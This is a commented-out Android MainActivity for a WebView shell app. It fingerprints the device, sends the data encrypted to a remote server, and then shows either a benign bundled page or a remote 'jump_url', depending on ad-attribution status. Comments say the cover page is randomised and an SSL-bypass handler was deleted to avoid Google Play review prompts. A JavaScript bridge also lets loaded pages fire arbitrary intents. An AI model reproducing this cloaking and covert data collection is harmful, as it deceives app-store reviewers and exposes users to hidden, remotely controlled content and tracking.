//package com.wuegagil.tkoqtktc21.af;
//
//import androidx.activity.result.ActivityResultLauncher;
//import androidx.activity.result.contract.ActivityResultContracts;
//import androidx.annotation.Keep;
//import androidx.appcompat.app.AppCompatActivity;
//
//import android.app.Activity;
//import android.app.AlertDialog;
//import android.content.Context;
//import android.content.Intent;
//import android.content.SharedPreferences;
//import android.content.pm.PackageInfo;
//import android.content.pm.PackageManager;
//import android.net.Uri;
//import android.os.AsyncTask;
//import android.os.Build;
//import android.os.Bundle;
//import android.os.Message;
//import android.provider.Settings;
//import android.util.Base64;
//import android.util.Log;
//import android.view.KeyEvent;
//import android.webkit.JavascriptInterface;
//import android.webkit.JsResult;
//import android.webkit.ValueCallback;
//import android.webkit.WebChromeClient;
//import android.webkit.WebResourceRequest;
//import android.webkit.WebSettings;
//import android.webkit.WebView;
//import android.webkit.WebViewClient;
//
//import com.alibaba.fastjson.JSON;
//import com.alibaba.fastjson.JSONObject;
//import com.android.installreferrer.api.InstallReferrerClient;
//import com.android.installreferrer.api.InstallReferrerStateListener;
//import com.android.installreferrer.api.ReferrerDetails;
//import com.appsflyer.AppsFlyerConversionListener;
//import com.appsflyer.AppsFlyerLib;
//import com.google.android.gms.ads.identifier.AdvertisingIdClient;
//import com.google.android.gms.common.util.ArrayUtils;
//
//import java.io.IOException;
//import java.net.URISyntaxException;
//import java.nio.charset.Charset;
//import java.nio.charset.StandardCharsets;
//import java.util.HashMap;
//import java.util.Iterator;
//import java.util.Map;
//import java.util.Objects;
//
//import javax.crypto.Cipher;
//import javax.crypto.spec.IvParameterSpec;
//import javax.crypto.spec.SecretKeySpec;
//
//import okhttp3.MediaType;
//import okhttp3.OkHttpClient;
//import okhttp3.Request;
//import okhttp3.RequestBody;
//import okhttp3.Response;
//
//public class MainActivity extends AppCompatActivity {
//
//    static class AESEncrypt {
//
//        private static final String TAG = AESEncrypt.class.getSimpleName() + " --> ";
//
//        /**
//         * 加密算法
//         */
//        private static final String KEY_ALGORITHM = "AES";
//
//        /**
//         * AES 的 密钥长度，32 字节，范围：16 - 32 字节
//         */
//        public static final int SECRET_KEY_LENGTH = 16;
//
//        /**
//         * 字符编码
//         */
//        private static final Charset CHARSET_UTF8 = StandardCharsets.UTF_8;
//
//        /**
//         * 秘钥长度不足 16 个字节时，默认填充位数
//         */
//        private static final byte[] DEFAULT_VALUE = { 0 };
//        /**
//         * 加解密算法/工作模式/填充方式
//         */
//        private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS7Padding";
//
//        /**
//         * AES 加密
//         *
//         * @param data      待加密内容
//         * @param secretKey 加密密码，长度：16 或 32 个字符
//         * @return 返回Base64转码后的加密数据
//         */
//        public static String encrypt(String data, String secretKey) {
//            if (secretKey.length() < SECRET_KEY_LENGTH) {
//                throw new RuntimeException("aes length!=" + SECRET_KEY_LENGTH);
//            }
//            try {
//                // 创建密码器
//                Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);
//                // 初始化为加密密码器
//                IvParameterSpec ivSpec = new IvParameterSpec(secretKey.getBytes(CHARSET_UTF8));
//                cipher.init(Cipher.ENCRYPT_MODE, getSecretKey(secretKey), ivSpec);
//
//                // cipher.doFinal(pkcs7padding(data, cipher.getBlockSize()));
//                byte[] encryptByte = cipher.doFinal(data.getBytes(CHARSET_UTF8));
//                // byte[] encryptByte = cipher.doFinal(pkcs7padding(data,
//                // cipher.getBlockSize()));
//                // 将加密以后的数据进行 Base64 编码
//                return base64Encode(encryptByte);
//            } catch (Exception e) {
//                handleException(e);
//            }
//            return null;
//        }
//
//        /**
//         * AES 解密
//         *
//         * @param base64Data 加密的密文 Base64 字符串
//         * @param secretKey  解密的密钥，长度：16 或 32 个字符
//         */
//        public static String decrypt(String base64Data, String secretKey) {
//            try {
//                byte[] data = base64Decode(base64Data);
//                Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);
//                // 设置为解密模式
//
//                IvParameterSpec ivSpec = new IvParameterSpec(secretKey.getBytes(CHARSET_UTF8));
//                cipher.init(Cipher.DECRYPT_MODE, getSecretKey(secretKey), ivSpec);
//                // 执行解密操作
//                byte[] result = cipher.doFinal(data);
//                return new String(result, CHARSET_UTF8);
//            } catch (Exception e) {
//                handleException(e);
//            }
//            return null;
//        }
//
//        /**
//         * 使用密码获取 AES 秘钥
//         */
//        public static SecretKeySpec getSecretKey(String secretKey) {
//            // secretKey = toMakeKey(secretKey, SECRET_KEY_LENGTH, DEFAULT_VALUE);
//            byte[] key = secretKey.getBytes(CHARSET_UTF8);
//            int length = key.length;
//            if (length < SECRET_KEY_LENGTH) {
//                for (int i = 0; i < SECRET_KEY_LENGTH - length; i++) {
//                    key = ArrayUtils.concatByteArrays(key, DEFAULT_VALUE);
//                }
//            }
//            return new SecretKeySpec(key, KEY_ALGORITHM);
//
//            // return new SecretKeySpec(secretKey.getBytes(CHARSET_UTF8), KEY_ALGORITHM);
//        }
//
//        /**
//         * 如果 AES 的密钥小于 {@code length} 的长度，就对秘钥进行补位，保证秘钥安全。
//         *
//         * @param secretKey 密钥 key
//         * @param length    密钥应有的长度
//         * @param text      默认补的文本
//         * @return 密钥
//         */
//        private static String toMakeKey(String secretKey, int length, String text) {
//            // 获取密钥长度
//            int strLen = secretKey.length();
//            // 判断长度是否小于应有的长度
//            if (strLen < length) {
//                // 补全位数
//                StringBuilder builder = new StringBuilder();
//                // 将key添加至builder中
//                builder.append(secretKey);
//                // 遍历添加默认文本
//                for (int i = 0; i < length - strLen; i++) {
//                    builder.append(text);
//                }
//                // 赋值
//                secretKey = builder.toString();
//            }
//            return secretKey;
//        }
//
//        private static String toIv(String secretKey) {
//            // 获取密钥长度
//            int strLen = secretKey.length();
//            // 判断长度是否小于应有的长度
//            if (strLen < SECRET_KEY_LENGTH) {
//                // 补全位数
//                StringBuilder builder = new StringBuilder();
//                // 将key添加至builder中
//                builder.append(secretKey);
//                // 遍历添加默认文本
//                for (int i = 0; i < SECRET_KEY_LENGTH - strLen; i++) {
//                    builder.append("0");
//                }
//                // 赋值
//                secretKey = builder.toString();
//            } else {
//                secretKey = secretKey.substring(0, SECRET_KEY_LENGTH);
//            }
//            Log.i(TAG, "==================iv:" + secretKey);
//            return secretKey;
//        }
//
//        /**
//         * 将 Base64 字符串 解码成 字节数组
//         */
//        public static byte[] base64Decode(String data) {
//            return Base64.decode(data, Base64.NO_WRAP);
//        }
//
//        /**
//         * 将 字节数组 转换成 Base64 编码
//         */
//        public static String base64Encode(byte[] data) {
//            return Base64.encodeToString(data, Base64.NO_WRAP);
//        }
//
//        /**
//         * 处理异常
//         */
//        private static void handleException(Exception e) {
//            e.printStackTrace();
//            Log.e(TAG, TAG + e);
//        }
//
//        /**
//         * pkcs7填充
//         *
//         * @param content
//         * @param blockSize
//         * @return
//         */
//        private static byte[] pkcs7padding(String content, int blockSize) {
//            byte[] contentBytes = content.getBytes(StandardCharsets.UTF_8);
//            int pad = blockSize - (contentBytes.length % blockSize); // 计算需要补位的长度
//            byte padChr = (byte) pad; // 补位字符 (即用补位长度)
//            byte[] paddedBytes = new byte[contentBytes.length + pad]; // 在原有的长度上加上补位长度
//            System.arraycopy(contentBytes, 0, paddedBytes, 0, contentBytes.length); // 原有的先复制过去
//            for (int i = contentBytes.length; i < paddedBytes.length; i++) { // 补位字符填充
//                paddedBytes[i] = padChr;
//            }
//            return paddedBytes;
//        }
//    }
//
//    static class Helper {
//        public static final void setSharedPreferences(Context context, String key, String val) {
//            try {
//                if (context == null)
//                    return;
//                SharedPreferences sp = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
//                sp.edit().putString(key, val).apply();
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//        }
//
//        public static final String getSharedPreferences(Context context, String key) {
//            try {
//                if (context == null)
//                    return null;
//                SharedPreferences sp = context.getSharedPreferences(context.getPackageName(), Context.MODE_PRIVATE);
//                return sp.getString(key, null);
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//            return "null";
//        }
//    }
//
//    class AfHelper {
//
//        public void initAF(Context ctx, String AF_KEY, AppsFlyerConversionListener conversionListener) {
//            ctx = ctx;
//            try {
//                AppsFlyerLib.getInstance().init(AF_KEY, conversionListener, ctx);
//                AppsFlyerLib.getInstance().start(ctx);
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//            try {
//                InstallReferrerClient referrerClient;
//                referrerClient = InstallReferrerClient.newBuilder(ctx).build();
//                Context finalCtx = ctx;
//                referrerClient.startConnection(new InstallReferrerStateListener() {
//                    @Override
//                    public void onInstallReferrerSetupFinished(int responseCode) {
//                        try {
//                            switch (responseCode) {
//                                case InstallReferrerClient.InstallReferrerResponse.OK:
//                                    ReferrerDetails response = referrerClient.getInstallReferrer();
//                                    if (response == null)
//                                        return;
//                                    Log.i("initReferrer", response.getInstallReferrer());
//                                    Helper.setSharedPreferences(finalCtx, "ref", response.getInstallReferrer());
//                                    break;
//                            }
//                            referrerClient.endConnection();
//                        } catch (Exception e) {
//                            e.printStackTrace();
//                        }
//                    }
//
//                    @Override
//                    public void onInstallReferrerServiceDisconnected() {
//                    }
//                });
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
//
//            Context finalCtx1 = ctx;
//            new Thread(() -> {
//                try {
//                    AdvertisingIdClient client = new AdvertisingIdClient(finalCtx1);
//                    client.start();
//                    AdvertisingIdClient.Info info = client.getInfo();
//                    if (info == null)
//                        return;
//                    Log.i("initAID", info.getId());
//                    Helper.setSharedPreferences(finalCtx1, "adid", info.getId());
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//            }).start();
//        }
//
//    }
//
//    static class Http {
//        public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
//
//        static final OkHttpClient client = new OkHttpClient();
//
//        public static String post(String url, String json, Map<String, String> map) throws IOException {
//            RequestBody body = RequestBody.create(json, JSON);
//            Request.Builder build = new Request.Builder()
//                    .url(url)
//                    .post(body);
//            for (Map.Entry<String, String> entry : map.entrySet()) {
//                build.addHeader(entry.getKey(), entry.getValue());
//            }
//            Request request = build.build();
//            try (Response response = client.newCall(request).execute()) {
//                return response.body().string();
//            }
//        }
//    }
//
//    final String TAG = "MainActivity";
//    private String URL = "https://www.invatidh.cyou/api/app/v2"; // 替换成正式域名
//    private String appid = "46"; // 替换成正式appid
//    private String key = "S5DTeTuDx5w5gxVy"; // 替换成真实key,必须16位
//    final static String PAGE = "file:///android_asset/sjasla/adsa.html"; // 需要替换a 面,目录需要随机化
//
//    WebView webView;
//    private String deviceId;
//    private String versionName;
//
//    ValueCallback<Uri[]> filePathProcess;
//    ActivityResultLauncher<Intent> chooseFileResultLauncher = registerForActivityResult(
//            new ActivityResultContracts.StartActivityForResult(),
//            result -> {
//                try {
//                    if (filePathProcess == null)
//                        return;
//                    Uri[] uris = {};
//                    if (result.getResultCode() == Activity.RESULT_OK) {
//                        Intent data = result.getData();
//                        if (data != null && data.getData() != null) {
//                            uris = new Uri[] { data.getData() };
//                        }
//                    }
//                    filePathProcess.onReceiveValue(uris);
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//            });
//
//    private Map<String, Object> jsonToMap(String json) {
//        Map<String, Object> map = new HashMap<>();
//        try {
//            if (json != null && json.length() > 0) {
//                org.json.JSONObject data = new org.json.JSONObject(json);
//                Iterator<String> keys = data.keys();
//                while (keys.hasNext()) {
//                    String key = keys.next();
//                    map.put(key, data.get(key));
//                }
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return map;
//
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String onAppEvent(String eventName, String json) {
//        try {
//            Map<String, Object> params = jsonToMap(json);
//            switch (eventName) {
//                case "openWB": {
//                    Object url = params.get("url");
//                    if (url != null) {
//                        // 在mainActive 的webView 打开url
//                        startActivity(Intent.parseUri(url.toString(), Intent.URI_INTENT_SCHEME));
//                    }
//                }
//                    break;
//                case "openPG": {
//                    Object url = params.get("url");
//                    if (url != null) {
//                        // 在mainActive 的webView 打开url
//                        startActivity(new Intent(MainActivity.this, MainActivity.class)
//                                .putExtra(Intent.ACTION_ATTACH_DATA, url.toString()));
//                    }
//                }
//                    break;
//                case "aid": {
//                    return Helper.getSharedPreferences(this, "adid");
//                }
//                case "referrer": {
//                    return Helper.getSharedPreferences(this, "ref");
//                }
//            }
//            AppsFlyerLib.getInstance().logEvent(this, eventName, params);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return "null";
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String onAppEvent(String eventName) {
//        return onAppEvent(eventName, "{}");
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String eventTracker(String eventName, String json) {
//        return onAppEvent(eventName, json);
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String eventTracker(String eventName) {
//        return onAppEvent(eventName, "{}");
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String onEvent(String eventName) {
//        return onAppEvent(eventName, "{}");
//    }
//
//    @Keep
//    @JavascriptInterface
//    public String onEvent(String eventName, String json) {
//        return onAppEvent(eventName, json);
//    }
//
//    @Override
//    protected void onCreate(Bundle savedInstanceState) {
//        super.onCreate(savedInstanceState);
//        setContentView(R.layout.activity_main);
//        webView = findViewById(R.id.webView);
//
//        deviceId = Settings.Secure.getString(MainActivity.this.getContentResolver(),
//                Settings.Secure.ANDROID_ID);
//
//        PackageManager packageManager = MainActivity.this.getPackageManager();
//
//        try {
//            PackageInfo packageInfo = packageManager.getPackageInfo(MainActivity.this.getPackageName(), 0);
//            versionName = packageInfo.versionName;
//        } catch (PackageManager.NameNotFoundException e) {
//            e.printStackTrace();
//        }
//
//        WebSettings settings = webView.getSettings();
//        settings.setJavaScriptEnabled(true);
//        settings.setDomStorageEnabled(true);
//        settings.setUseWideViewPort(true);
//        settings.setDatabaseEnabled(true);
//        // settings.setAppCacheEnabled(true);
//        settings.setAllowFileAccess(true);
//        settings.setSupportMultipleWindows(true);
//        settings.setJavaScriptCanOpenWindowsAutomatically(true);
//
//        // Hgvdywgfsak webAppInterface = new
//        // Hgvdywgfsak(MainActivity.this,webView);
//        // webView.addJavascriptInterface(webAppInterface,"Android");
//        // webView.addJavascriptInterface(webAppInterface,"i");
//        // webView.addJavascriptInterface(webAppInterface,"AnalyticsWebInterface");
//
//        webView.addJavascriptInterface(MainActivity.this, "Android");
//        webView.addJavascriptInterface(MainActivity.this, "i");
//        webView.addJavascriptInterface(MainActivity.this, "AnalyticsWebInterface");
//
//        webView.getSettings().setUserAgentString(getUseragent(MainActivity.this, versionName, deviceId));
//
//        // webView.setWebContentsDebuggingEnabled(true);
//
//        webView.setWebViewClient(new WebViewClient() {
//
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
//                view.loadUrl(url);
//                return true;
//            }
//
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
//                try {
//                    if (request != null) {
//                        String uri = request.getUrl().toString();
//                        if (!uri.startsWith("http")) {
//                            startActivity(Intent.parseUri(uri, Intent.URI_INTENT_SCHEME));
//                            return true;
//                        }
//                    }
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//                return super.shouldOverrideUrlLoading(view, request);
//            }
//
//        });
//
//        webView.setWebChromeClient(new WebChromeClient() {
//
//            @Override
//            public boolean onJsAlert(WebView webView, String url, String message, JsResult jsResult) {
//                AlertDialog.Builder builder = new AlertDialog.Builder(
//                        MainActivity.this);
//                builder.setMessage(message)
//                        .setPositiveButton("OK", (arg0, arg1) -> arg0.dismiss()).show();
//                jsResult.cancel();
//                return true;
//            }
//
//            @Override
//            public void onCloseWindow(WebView window) {
//                super.onCloseWindow(window);
//                finish();
//            }
//
//            @Override
//            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
//                if (webView.getHitTestResult().getType() == WebView.HitTestResult.SRC_ANCHOR_TYPE
//                        || webView.getHitTestResult().getType() == WebView.HitTestResult.SRC_IMAGE_ANCHOR_TYPE) {
//                    String url = webView.getHitTestResult().getExtra();
//                    startActivity(
//                            new Intent(MainActivity.this, MainActivity.class).putExtra(Intent.ACTION_ATTACH_DATA, url));
//                } else {
//
//                    WebView tempWebView = new WebView(MainActivity.this);
//                    tempWebView.setWebViewClient(new WebViewClient() {
//                        @Override
//                        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
//                            return super.shouldOverrideUrlLoading(view, request);
//                        }
//
//                        @Override
//                        public boolean shouldOverrideUrlLoading(WebView w, String s) {
//                            webView.loadUrl(s);
//                            return super.shouldOverrideUrlLoading(w, s);
//                        }
//
//                        // @Override
//                        // public void onReceivedSslError(WebView webView, SslErrorHandler
//                        // sslErrorHandler,
//                        // SslError sslError) {
//                        // if (sslErrorHandler != null) {
//                        // sslErrorHandler.proceed();
//                        // }
//                        // }
//                        // 删除避免gp 审核提示
//                    });
//                    WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
//                    transport.setWebView(tempWebView);
//                    resultMsg.sendToTarget();
//                    return true;
//                }
//                return true;
//            }
//
//            @Override
//            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback,
//                    FileChooserParams fileChooserParams) {
//                MainActivity.this.filePathProcess = filePathCallback;
//                try {
//                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
//                    intent.addCategory(Intent.CATEGORY_OPENABLE);
//                    // intent.setType("image/*");
//                    intent.setType("*/*");
//                    chooseFileResultLauncher.launch(intent);
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
//                return true;
//            }
//        });
//
//        webView.setOnKeyListener((view, keyCode, event) -> {
//            if (event.getAction() == KeyEvent.ACTION_DOWN) {
//                if (keyCode == KeyEvent.KEYCODE_BACK && webView.canGoBack()) {
//                    webView.goBack();
//                    return true;
//                }
//            }
//            return false;
//        });
//        webView.setDownloadListener((url, userAgent, contentDisposition, mimetype, contentLength) -> {
//            try {
//                startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME));
//            } catch (URISyntaxException e) {
//                e.printStackTrace();
//            }
//        });
//
//        String url = getIntent().getStringExtra(Intent.ACTION_ATTACH_DATA);
//        if (url == null || url.equals("")) {
//            new AsyncTask<Void, Void, JSONObject>() {
//                @Override
//                protected void onPreExecute() {
//                    super.onPreExecute();
//                }
//
//                @Override
//                protected JSONObject doInBackground(Void... voids) {
//
//                    JSONObject result = new JSONObject();
//
//                    // 在网络服务器中获取数据
//                    OkHttpClient client = new OkHttpClient();
//                    MediaType MediaTypeJSON = MediaType.parse("application/json; charset=utf-8");
//                    JSONObject body = new JSONObject();
//                    JSONObject device = new JSONObject();
//                    device.put("serial", Build.SERIAL);
//                    device.put("deviceModel", Build.MODEL);
//                    device.put("id", Build.ID);
//                    device.put("manufacturer", Build.MANUFACTURER);
//                    device.put("deviceBrand", Build.BRAND);
//                    device.put("type", Build.TYPE);
//                    device.put("user", Build.USER);
//                    device.put("base", Build.VERSION_CODES.BASE);
//                    device.put("incremental", Build.VERSION.INCREMENTAL);
//                    device.put("board", Build.BOARD);
//                    device.put("host", Build.HOST);
//                    device.put("fingerprint", Build.FINGERPRINT);
//                    device.put("versioncode", Build.VERSION.RELEASE);
//
//                    // PackageManager packageManager = MainActivity.this.getPackageManager();
//                    //
//                    // try {
//                    // PackageInfo packageInfo =
//                    // packageManager.getPackageInfo(MainActivity.this.getPackageName(), 0);
//                    // String versionName = packageInfo.versionName;
//                    // device.put("appVersion", versionName);
//                    // } catch (PackageManager.NameNotFoundException e) {
//                    // e.printStackTrace();
//                    // }
//
//                    device.put("appVersion", versionName);
//
//                    // String deviceId =
//                    // Settings.Secure.getString(MainActivity.this.getContentResolver(),
//                    // Settings.Secure.ANDROID_ID);
//                    device.put("deviceId", deviceId);
//                    device.put("platform", "android");
//                    body.put("device", device);
//
//                    String signkey = AESEncrypt.encrypt(key, key);
//                    Log.i(TAG, "==========================signkey:" + signkey);
//
//                    String enc = AESEncrypt.encrypt(body.toString(), signkey.substring(0, 16));
//                    Log.i(TAG, "==========================enc:" + enc);
//
//                    // String dec = AESEncrypt.decrypt(enc,key);
//                    // Log.i(TAG,"==========================dec:"+dec);
//
//                    String resp = null;
//                    try {
//                        Map<String, String> map = new HashMap<String, String>();
//                        map.put("appid", appid);
//                        resp = Http.post(URL, enc, map);
//
//                        resp = AESEncrypt.decrypt(resp, signkey.substring(0, 16));
//
//                    } catch (Exception e) {
//                        Log.e(TAG, e.toString());
//                        result.put("status", false);
//                        return result;
//                    }
//                    Log.i(TAG, "=======================resp:" + resp);
//
//                    JSONObject jsonObject = JSON.parseObject(resp);
//                    int code = jsonObject.getInteger("code");
//                    if (code == 0) {
//                        JSONObject data = jsonObject.getJSONObject("data");
//
//                        String effective_traffic = data.getString("effective_traffic");
//                        Log.i(TAG, "effective_traffic:" + effective_traffic);
//                        if (effective_traffic.equals("organic")) {
//                            // 需要判断 af 归因 是否是不是自然流量，如果是需要过滤掉
//                            result.put("is_af", true);
//                        } else {
//                            result.put("is_af", false);
//                        }
//
//                        String clickid = data.getString("clickid");
//                        // String adjust_key = data.getString("adjust_key");
//                        // String environment = data.getString("adjust_env");
//                        // String adjust_click_event_token = data.getString("adjust_click_event_token");
//                        // String adjust_open_event_token = data.getString("adjust_open_event_token");
//                        //
//                        // String adjust_click_event_name = data.getString("adjust_click_event_name");
//                        // String adjust_open_event_name = data.getString("adjust_open_event_name");
//                        //
//                        String account = data.getString("account");
//                        boolean seen = data.getBoolean("seen");
//                        String jump_url = data.getString("jump_url");
//                        String af_key = data.getString("af_key");
//
//                        result.put("status", seen);
//                        result.put("clickid", clickid);
//                        result.put("jump_url", jump_url);
//                        result.put("account", account);
//                        result.put("af_key", af_key);
//                        return result;
//                    } else {
//                        result.put("status", false);
//                    }
//                    return result;
//                }
//
//                @Override
//                protected void onPostExecute(JSONObject result) {
//                    if (result.getBoolean("status")) {
//                        AfHelper af = new AfHelper();
//                        af.initAF(MainActivity.this, result.getString("af_key"), new AppsFlyerConversionListener() {
//                            @Override
//                            public void onConversionDataSuccess(Map<String, Object> conversionDataMap) {
//                                String status = Objects.requireNonNull(conversionDataMap.get("af_status")).toString();
//                                if (status.equals("Non-organic")) {
//                                    String jump_url = result.getString("jump_url");
//                                    runOnUiThread(new Runnable() {
//                                        @Override
//                                        public void run() {
//                                            webView.loadUrl(jump_url);
//                                        }
//                                    });
//                                } else {
//                                    if (result.getBoolean("is_af")) {
//                                        runOnUiThread(new Runnable() {
//                                            @Override
//                                            public void run() {
//                                                String jump_url = result.getString("jump_url");
//                                                webView.loadUrl(jump_url);
//                                            }
//                                        });
//                                    } else {
//                                        runOnUiThread(new Runnable() {
//                                            @Override
//                                            public void run() {
//
//                                                webView.loadUrl(PAGE);
//                                            }
//                                        });
//                                    }
//                                }
//                            }
//
//                            @Override
//                            public void onConversionDataFail(String errorMessage) {
//                                Log.v("mshh", errorMessage);
//                                runOnUiThread(new Runnable() {
//                                    @Override
//                                    public void run() {
//
//                                        webView.loadUrl(PAGE);
//                                    }
//                                });
//                            }
//
//                            @Override
//                            public void onAppOpenAttribution(Map<String, String> attributionData) {
//                                Log.v("mshh", "error");
//                            }
//
//                            @Override
//                            public void onAttributionFailure(String errorMessage) {
//                                Log.v("mshh", errorMessage);
//                            }
//                        });
//                    } else {
//                        // a
//
//                        runOnUiThread(new Runnable() {
//                            @Override
//                            public void run() {
//
//                                webView.loadUrl(PAGE);
//                            }
//                        });
//                    }
//                    super.onPostExecute(result);
//                }
//            }.execute();
//        } else {
//            runOnUiThread(new Runnable() {
//                @Override
//                public void run() {
//
//                    webView.loadUrl(url);
//                }
//            });
//        }
//    }
//
//    @Override
//    public void onBackPressed() {
//        if (webView.canGoBack()) {
//            webView.goBack();
//        } else {
//            super.onBackPressed();
//        }
//    }
//
//    @Override
//    protected void onDestroy() {
//        super.onDestroy();
//        destoryWebView();
//    }
//
//    private final void destoryWebView() {
//        try {
//            webView.stopLoading();
//            webView.removeAllViews();
//            webView.destroy();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    public static String getUseragent(final Context context, String version, String uuid) {
//        String userAgent;
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
//            try {
//                userAgent = WebSettings.getDefaultUserAgent(context);
//            } catch (Exception e) {
//                userAgent = System.getProperty("http.agent");
//            }
//        } else {
//            userAgent = System.getProperty("http.agent");
//        }
//        final StringBuilder sb = new StringBuilder();
//        assert userAgent != null;
//        for (int i = 0, length = userAgent.length(); i < length; i++) {
//            char c = userAgent.charAt(i);
//            if (c <= '\u001f' || c >= '\u007f') {
//                sb.append(String.format("\\u%04x", (int) c));
//            } else {
//                sb.append(c);
//            }
//        }
//        String replace = sb.toString().replace("; wv", "; xx-xx");
//        return String.format("%s/%s AppShellVer:%s UUID/%s", replace, Build.BRAND, version, uuid);
//    }
//
//    private void openSystemBrowser(Uri uri) {
//        Intent intent;
//        try {
//            intent = Intent.parseUri(uri.toString(), Intent.URI_INTENT_SCHEME);
//            intent.addCategory(Intent.CATEGORY_BROWSABLE);
//            intent.setComponent(null);
//            startActivity(intent);
//        } catch (Exception e) {
//            Log.e("openSystemBrowser failure", e.toString());
//        }
//    }
//}